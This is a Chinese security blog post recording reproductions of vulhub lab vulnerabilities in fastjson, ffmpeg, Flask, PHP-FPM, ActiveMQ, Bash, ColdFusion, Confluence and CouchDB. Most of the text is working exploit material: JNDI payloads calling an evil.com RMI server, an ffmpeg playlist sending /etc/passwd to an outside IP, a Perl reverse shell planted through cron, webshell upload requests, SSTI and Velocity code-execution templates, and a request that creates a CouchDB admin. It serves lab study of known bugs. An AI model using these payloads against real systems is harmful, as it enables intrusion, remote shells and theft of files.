<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="cop's blog"><link rel="stylesheet" type="text/css" href="//fonts.loli.net/css?family=Source+Code+Pro"><link rel="stylesheet" type="text/css" href="/css/style.css?v=2.0.5"><link rel="stylesheet" type="text/css" href="/css/highlight.css?v=2.0.5"><link rel="Shortcut Icon" href="/favicon.ico"><link rel="bookmark" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><title>vulhub复现记录 | cop's blog</title></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">vulhub复现记录</h1><a id="logo" href="/.">cop's blog</a><p class="description"></p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> Start</i></a><a href="/archives/"><i class="fa fa-archive"> Archiv</i></a><a href="/about/"><i class="fa fa-user"> Über</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div><div id="search-form"><div id="result-mask" class="hide"></div><label><input id="search-key" type="text" autocomplete="off" placeholder="Suche"></label><div id="result-wrap" class="hide"><div id="search-result"></div></div><div class="hide"><template id="search-tpl"><div class="item"><a href="/{path}" title="{title}"><div class="title">{title}</div><div class="time">{date}</div><div class="tags">{tags}</div></a></div></template></div></div></div><div id="layout" class="layout-g"><div class="layout-l"><div class="content_container"><div class="post"><h1 class="post-title">vulhub复现记录</h1><div class="post-meta"><a href="/2020/07/13/vulhub复现记录/#comments" class="comment-count"></a><p><span class="date">Jul 13, 2020</span><span><i id="busuanzi_container_page_pv"><i id="busuanzi_value_page_pv"></i><i>Schlägt</i></i></span></p></div><div class="post-content"><h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><p>搭建rmi服务，编译java文件，搭建好攻击环境<br>post传不合法的json格式数据，根据报错判断是不是fastjson<br>也可以用<a href="https://github.com/uknowsec/BurpSuite-Extender-fastjson" target="_blank" rel="noopener">burpsuite插件</a> 自动检测fastjson rce的py插件，可检测1.2.24和1.2.47<br>检测是否存在漏洞可以用dnslog</p>
<h3 id="1-2-24-rce"><a href="#1-2-24-rce" class="headerlink" title="1.2.24-rce"></a>1.2.24-rce</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TouchFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">"touch"</span>, <span class="string">"/tmp/success"</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译好class文件，放到web服务器上，搭建rmi服务<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com/#TouchFile" 9999</span><br></pre></td></tr></table></figure></p>
<p>post payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"b"</span>:&#123;</span><br><span class="line">        <span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="string">"dataSourceName"</span>:<span class="string">"rmi://evil.com:9999/Exploit"</span>,</span><br><span class="line">        <span class="string">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>进入docker里面可以看到/tmp/success已经创建成功</p>
<h3 id="1-2-47-rce"><a href="#1-2-47-rce" class="headerlink" title="1.2.47-rce"></a>1.2.47-rce</h3><p>class文件同1.2.27，payload为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"a"</span>:&#123;</span><br><span class="line">        <span class="string">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="string">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"b"</span>:&#123;</span><br><span class="line">        <span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="string">"dataSourceName"</span>:<span class="string">"rmi://evil.com:9999/Exploit"</span>,</span><br><span class="line">        <span class="string">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="ffmpeg"><a href="#ffmpeg" class="headerlink" title="ffmpeg"></a>ffmpeg</h2><p>FFmpeg是一套可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序。</p>
<h3 id="CVE-2016-1897"><a href="#CVE-2016-1897" class="headerlink" title="CVE-2016-1897"></a>CVE-2016-1897</h3><p>分析文章如下<br><a href="http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a><br><a href="http://blog.neargle.com/SecNewsBak/drops/CVE-2016-1897.8%20-%20FFMpeg%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">http://blog.neargle.com/SecNewsBak/drops/CVE-2016-1897.8%20-%20FFMpeg%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html</a><br>大概就是上传视频文件的时候，用ffmpeg解析了视频，解析过程中存在ssrf<br>利用过程<br>上传mp4文件,内容如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#EXTM3U</span></span><br><span class="line"><span class="comment">#EXT-X-MEDIA-SEQUENCE:0</span></span><br><span class="line"><span class="comment">#EXTINF:10.0,</span></span><br><span class="line">concat:http://47.95.119.220/ffmpeg/header.m3u8|file:///etc/passwd</span><br><span class="line"><span class="comment">#EXT-X-ENDLIST</span></span><br></pre></td></tr></table></figure></p>
<p>header.m3u8 内容如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#EXTM3U</span></span><br><span class="line"><span class="comment">#EXT-X-MEDIA-SEQUENCE:0</span></span><br><span class="line"><span class="comment">#EXTINF:,</span></span><br><span class="line">http://47.95.119.220:2333/?</span><br></pre></td></tr></table></figure></p>
<p>按理说监听端口即可接受到/etc/passwd内容，我这里试了很多次没成功，只能收到这个请求，而且docker打一次就挂。。打一次就得重新开一次</p>
<h3 id="pldays"><a href="#pldays" class="headerlink" title="pldays"></a>pldays</h3><p>之前打ctf遇到一道这样的题，注入进后台没有getshell的地方，有个上传视频文件的接口，就用的这个读flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 下载exp</span><br><span class="line">git clone https://github.com/neex/ffmpeg-avi-m3u-xbin</span><br><span class="line">cd ffmpeg-avi-m3u-xbin</span><br><span class="line"></span><br><span class="line"># 生成payload</span><br><span class="line">./gen_xbin_avi.py file:///etc/passwd exp.avi</span><br></pre></td></tr></table></figure></p>
<p>生成的exp.avi上传之后再下载查看，第一帧就是读到的文件内容</p>
<h2 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h2><h3 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h3><p>ssti就没啥说的了，打ctf很常见，这也是一个没有任何过滤的环境<br>poc<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("id").read()'</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="fpm"><a href="#fpm" class="headerlink" title="fpm"></a>fpm</h2><p><a href="https://xz.aliyun.com/t/5598" target="_blank" rel="noopener">https://xz.aliyun.com/t/5598</a><br><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a><br>大概就是伪造nginx的发送fastCGI封装的数据给php-fpm去解析<br>然后更改php.ini的配置auto_prepend_file和auto_append_file<br>设置auto_prepend_file为php://input，进行文件包含rce(远程需要开启allow_url_include，本地不用)<br>如果fastcgi监听端口设置为: listen = 0.0.0.0:9000而不是listen = 127.0.0.1:9000，可以远程代码执行，此处环境就是远程代码执行<br>如果监听在本地，通过ssrf，用gopher协议也可以打fpm，这是之前打ctf遇到的情况<br>这里直接用<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">p神的脚本</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fpm.py -c <span class="string">'&lt;?php echo `id`;exit;?&gt;'</span> -p 9000 47.95.119.220 /usr/<span class="built_in">local</span>/lib/php/PEAR.php</span><br></pre></td></tr></table></figure></p>
<h2 id="activemq"><a href="#activemq" class="headerlink" title="activemq"></a>activemq</h2><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等</p>
<h3 id="ActiveMQ反序列化漏洞（CVE-2015-5254）"><a href="#ActiveMQ反序列化漏洞（CVE-2015-5254）" class="headerlink" title="ActiveMQ反序列化漏洞（CVE-2015-5254）"></a>ActiveMQ反序列化漏洞（CVE-2015-5254）</h3><p>漏洞利用过程如下：</p>
<ol>
<li>构造（可以使用ysoserial）可执行命令的序列化对象</li>
<li>作为一个消息，发送给目标61616端口</li>
<li>访问web管理页面，读取消息，触发漏洞<br>1&amp;2 payload<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y <span class="string">"touch /tmp/success"</span> -Yp ROME 47.95.119.220 61616</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>默认账号密码admin/admin登陆后台查看队列，点击队列信息触发，进入docker可以看到success文件已经创建</p>
<h3 id="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><a href="#ActiveMQ任意文件写入漏洞（CVE-2016-3088）" class="headerlink" title="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"></a>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</h3><p>fileserver是一个RESTful API接口，可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作<br>版本：5.12.x〜5.13.x版本中，已经关闭了文件服务器这个应用，可以在conf/jetty.xml中开启<br>在5.14.0版本以后，彻底删除了fileserver应用<br>这个漏洞可以任意写入文件，但是不解析jsp，可以移动文件，删除文件<br>利用方法：</p>
<ol>
<li>写入webshell（需要登陆后台）</li>
<li>写入cron或ssh key等文件（需要root权限）</li>
<li>写入jar或jetty.xml等库和配置文件（需要知道activemq的绝对路径）<h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h4>访问<a href="http://your-ip:8161/admin/test/systemProperties.jsp，查看ActiveMQ的绝对路径为" target="_blank" rel="noopener">http://your-ip:8161/admin/test/systemProperties.jsp，查看ActiveMQ的绝对路径为</a> /opt/activemq<br>上传shell<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/2.txt HTTP/1.1</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 120976</span><br><span class="line"></span><br><span class="line">webshell...</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>移动到web目录下的api文件夹<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOVE /fileserver/2.txt HTTP/1.1</span><br><span class="line">Destination: file:///opt/activemq/webapps/api/s.jsp</span><br><span class="line">Host: localhost:8161</span><br></pre></td></tr></table></figure></p>
<p>访问webshell /api/s.jsp</p>
<h4 id="写入crontab，自动化弹shell"><a href="#写入crontab，自动化弹shell" class="headerlink" title="写入crontab，自动化弹shell"></a>写入crontab，自动化弹shell</h4><p>上传cron配置文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/1.txt HTTP/1.1</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 248</span><br><span class="line"></span><br><span class="line">*/1 * * * * root /usr/bin/perl -e <span class="string">'use Socket;$i="47.95.119.220";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure></p>
<p>将其移动到/etc/cron.d/root<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOVE /fileserver/1.txt HTTP/1.1</span><br><span class="line">Destination: file:///etc/cron.d/root</span><br></pre></td></tr></table></figure></p>
<h2 id="AppWeb"><a href="#AppWeb" class="headerlink" title="AppWeb"></a>AppWeb</h2><p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p>
<h3 id="appweb认证绕过漏洞（CVE-2018-8715）"><a href="#appweb认证绕过漏洞（CVE-2018-8715）" class="headerlink" title="appweb认证绕过漏洞（CVE-2018-8715）"></a>appweb认证绕过漏洞（CVE-2018-8715）</h3><p>7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为null（也就是没有传递密码参数）<br>appweb将因为一个逻辑错误导致直接认证成功，并返回session。<br>需要一个已知的用户名，构造头Authorization: Digest username=admin 发包 得到seesion</p>
<h2 id="aria2"><a href="#aria2" class="headerlink" title="aria2"></a>aria2</h2><p>Aria2是一个命令行下轻量级、多协议、多来源的下载工具（支持 HTTP/HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。</p>
<h3 id="Aria2-任意文件写入漏洞"><a href="#Aria2-任意文件写入漏洞" class="headerlink" title="Aria2 任意文件写入漏洞"></a>Aria2 任意文件写入漏洞</h3><p>在未设置任何安全措施的情况下，aria2可以接受任何未知来源的请求指令，任意下载文件，下载文件到/etc/cron.d 执行计划任务反弹shell，详情参考 文档<br><a href="https://github.com/vulhub/vulhub/blob/master/aria2/rce/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/aria2/rce/README.zh-cn.md</a><br>计划任务最后必须有个换行</p>
<h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><h3 id="Shellshock-破壳漏洞（CVE-2014-6271）"><a href="#Shellshock-破壳漏洞（CVE-2014-6271）" class="headerlink" title="Shellshock 破壳漏洞（CVE-2014-6271）"></a>Shellshock 破壳漏洞（CVE-2014-6271）</h3><p>bash4.3生成的页面存在漏洞<br>直接加header头<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: () &#123; foo; &#125;; <span class="built_in">echo</span> Content-Type: text/plain; <span class="built_in">echo</span>; /usr/bin/id</span><br></pre></td></tr></table></figure></p>
<h2 id="cgi"><a href="#cgi" class="headerlink" title="cgi"></a>cgi</h2><h3 id="HTTPoxy漏洞（CVE-2016-5385"><a href="#HTTPoxy漏洞（CVE-2016-5385" class="headerlink" title="HTTPoxy漏洞（CVE-2016-5385)"></a>HTTPoxy漏洞（CVE-2016-5385)</h3><p>vulhub的官方文档看的晕乎乎的，不过之前做过这样的ctf题，下面这篇分析说的很清楚<br><a href="https://www.laruence.com/2016/07/19/3101.html" target="_blank" rel="noopener">https://www.laruence.com/2016/07/19/3101.html</a><br>PHP5.6.24版本修复了这个洞<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">服务会对外请求资源</span><br><span class="line">服务使用了HTTP_PROXY(大写的)环境变量来代理你的请求（可能是你自己写，或是使用一些有缺陷的类库）</span><br><span class="line">服务跑在PHP的CGI模式下(cgi, php-fpm)</span><br></pre></td></tr></table></figure></p>
<p>作用就是代理这个对外请求，可以让这个请求到任意内容，也可以截获这个请求包</p>
<h2 id="coldfusion"><a href="#coldfusion" class="headerlink" title="coldfusion"></a>coldfusion</h2><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p>
<h3 id="Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）"><a href="#Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）" class="headerlink" title="Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）"></a>Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</h3><p>Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件<br>利用:直接访问<a href="http://47.95.119.220:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en，即可读取文件/etc/passwd" target="_blank" rel="noopener">http://47.95.119.220:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en，即可读取文件/etc/passwd</a></p>
<h3 id="Adobe-ColdFusion-反序列化漏洞（CVE-2017-3066）"><a href="#Adobe-ColdFusion-反序列化漏洞（CVE-2017-3066）" class="headerlink" title="Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）"></a>Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）</h3><p><a href="https://blog.csdn.net/JiangBuLiu/article/details/94001479" target="_blank" rel="noopener">https://blog.csdn.net/JiangBuLiu/article/details/94001479</a><br>ColdFusionPwn工具来生成POC<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 'touch /tmp/success' poc.ser</span><br></pre></td></tr></table></figure></p>
<p>将POC作为数据包body发送给<a href="http://47.95.119.220:8500/flex2gateway/amf，Content-Type为application/x-amf" target="_blank" rel="noopener">http://47.95.119.220:8500/flex2gateway/amf，Content-Type为application/x-amf</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /flex2gateway/amf HTTP/1.1</span><br><span class="line">Host: your-ip:8500</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-amf</span><br><span class="line">Content-Length: 2853</span><br><span class="line"></span><br><span class="line">[...poc...]</span><br></pre></td></tr></table></figure></p>
<h2 id="confluence"><a href="#confluence" class="headerlink" title="confluence"></a>confluence</h2><p>Atlassian Confluence是企业广泛使用的wiki系统</p>
<h3 id="Atlassian-Confluence-路径穿越与命令执行漏洞（CVE-2019-3396）"><a href="#Atlassian-Confluence-路径穿越与命令执行漏洞（CVE-2019-3396）" class="headerlink" title="Atlassian Confluence 路径穿越与命令执行漏洞（CVE-2019-3396）"></a>Atlassian Confluence 路径穿越与命令执行漏洞（CVE-2019-3396）</h3><p>Atlassian Confluence是企业广泛使用的wiki系统，长亭wiki用的就是这个<br>影响版本 6.6.12之前所有6.6.x版本，6.12.3之前所有6.12.x版本，6.13.13之前所有6.13.x版本，6.14.2之前所有6.14.x版本。<br>利用 ：<br>向/rest/tinymce/1/macro/preview post 发送payload,读到../web.xml<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"contentId"</span>:<span class="string">"786458"</span>,<span class="string">"macro"</span>:&#123;<span class="string">"name"</span>:<span class="string">"widget"</span>,<span class="string">"body"</span>:<span class="string">""</span>,<span class="string">"params"</span>:&#123;<span class="string">"url"</span>:<span class="string">"https://www.viddler.com/v/23464dc6"</span>,<span class="string">"width"</span>:<span class="string">"1000"</span>,<span class="string">"height"</span>:<span class="string">"1000"</span>,<span class="string">"_template"</span>:<span class="string">"../web.xml"</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>6.12以前的Confluence没有限制文件读取的协议和路径,可以用file:///etc/passwd来读取文件，也可以通过https://…或ftp://来加载远程文件<br>java的安全策略不能加载htpp，加载远程代码可以以rce <a href="https://www.mrwu.red/web/2584.html" target="_blank" rel="noopener">https://www.mrwu.red/web/2584.html</a> 以下代码保存成cmd.vm<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#set ($e="exp")</span></span><br><span class="line"><span class="comment">#set ($a=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($cmd))</span></span><br><span class="line"><span class="comment">#set ($input=$e.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))</span></span><br><span class="line"><span class="comment">#set($sc = $e.getClass().forName("java.util.Scanner"))</span></span><br><span class="line"><span class="comment">#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName("java.io.InputStream")))</span></span><br><span class="line"><span class="comment">#set($scan=$constructor.newInstance($input).useDelimiter("\\A"))</span></span><br><span class="line"><span class="comment">#if($scan.hasNext())</span></span><br><span class="line">    <span class="variable">$scan</span>.next()</span><br><span class="line"><span class="comment">#end</span></span><br></pre></td></tr></table></figure></p>
<p>post发包<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"contentId"</span>:<span class="string">"786458"</span>,<span class="string">"macro"</span>:&#123;<span class="string">"name"</span>:<span class="string">"widget"</span>,<span class="string">"body"</span>:<span class="string">""</span>,<span class="string">"params"</span>:&#123;<span class="string">"url"</span>:<span class="string">"https://www.viddler.com/v/23464dc6"</span>,<span class="string">"width"</span>:<span class="string">"1000"</span>,<span class="string">"height"</span>:<span class="string">"1000"</span>,<span class="string">"_template"</span>:<span class="string">"https://ip/cmd.vm"</span>,<span class="string">"command"</span>:<span class="string">"id"</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="couchdb"><a href="#couchdb" class="headerlink" title="couchdb"></a>couchdb</h2><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p>
<h3 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</h3><p>这个漏洞可以让任意用户创建管理员<br>影响版本：小于 1.7.0 以及 小于 2.1.1<br>利用：直接发如下数据包<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PUT /_users/org.couchdb.user:vulhub HTTP/1.1</span><br><span class="line">Host: ip:5984</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 108</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"type"</span>: <span class="string">"user"</span>,</span><br><span class="line">  <span class="string">"name"</span>: <span class="string">"vulhub"</span>,</span><br><span class="line">  <span class="string">"roles"</span>: [<span class="string">"_admin"</span>],</span><br><span class="line">  <span class="string">"roles"</span>: [],</span><br><span class="line">  <span class="string">"password"</span>: <span class="string">"vulhub"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>再次访问/_utils/ 即可用账号密码vulhub登陆</p>
